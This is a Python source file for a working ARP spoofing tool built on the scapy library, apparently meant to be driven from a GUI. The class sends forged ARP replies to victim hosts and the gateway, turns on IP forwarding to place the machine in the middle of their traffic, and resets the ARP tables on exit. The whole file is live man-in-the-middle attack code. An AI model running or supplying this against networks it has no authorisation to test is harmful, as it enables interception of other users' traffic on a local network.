#!/usr/bin/env python3

import scapy.all as scapy
import time
import subprocess


class ARPSpoofer:
    def __init__(self, gateway_ip, victim_ips, progress):
        self.victim_ips = victim_ips
        self.gateway_ip = gateway_ip
        self.sent_packets_count = 0
        self.progress = progress
        self.stop = 0

    def set_stop(self):
        self.stop = 1

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF:FF")
        arp_request_broadcast = broadcast / arp_request

        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return answered_list[0][1].hwsrc

    def spoof(self, target_ip, spoof_ip, target_mac):
        # target_mac = get_mac(target_ip)
        # Response ARP packet that send to the destination configured and tell them we have the router ip
        packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def run(self):
        self.enable_ip_forwarding()
        self.progress.emit("[+] Enabled IP forwarding")
        gateway_mac = None
        victim_mac = None
        # Get gateway's MAC address
        gateway_arp_reply = False
        while gateway_arp_reply is False and self.stop == 0:
            try:
                gateway_mac = self.get_mac(self.gateway_ip)
                gateway_arp_reply = True
            except IndexError:
                self.progress.emit("[-] Failed to obtain target's MAC address, it might be caused by target not "
                                   "responding to ARP Request, retrying...")
        while True:
            for victim_ip in self.victim_ips:
                # Get victim's MAC address
                victim_arp_reply = False
                while victim_arp_reply is False and self.stop == 0:
                    try:
                        victim_mac = self.get_mac(victim_ip)
                        victim_arp_reply = True
                    except IndexError:
                        self.progress.emit(
                            "[-] Failed to obtain victim's MAC address, it might be caused by target not responding "
                            "to ARP Request, retrying...")
                # Start spoofing
                self.spoof(victim_ip, self.gateway_ip, victim_mac)
                self.spoof(self.gateway_ip, victim_ip, gateway_mac)
                self.sent_packets_count += 2
                self.progress.emit("[+] 2 ARP packets sent")
                print("\r[+] Packets sent: " + str(self.sent_packets_count), end="")
                if self.stop == 1:
                    break
                time.sleep(2)
            if self.stop == 1:
                break
        # Conclude results and restore IPTables rules
        self.progress.emit("[+] Resetting ARP Tables... Please wait.")
        print("\n[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
        for victim_ip in self.victim_ips:
            self.restore(victim_ip, self.gateway_ip)
            self.restore(self.gateway_ip, victim_ip)
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        self.progress.emit("[+] Disabled IP forwarding")
        self.progress.emit("[+] Total packets sent: " + str(self.sent_packets_count))

    def restore(self, target_ip, source_ip):
        target_mac = None
        source_mac = None
        # Obtain MAC addresses
        target_arp_reply = False
        source_arp_reply = False
        try:
            target_mac = self.get_mac(target_ip)
            source_mac = self.get_mac(source_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, verbose=False, count=4)
        except IndexError:
            self.progress.emit("[-] Failed to restore target/victim ARP table, it might be caused by target/victim not "
                               "responding to ARP Request")

    def enable_ip_forwarding(self):
        print("\n[+] Enabling IP forwarding.....\n")
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
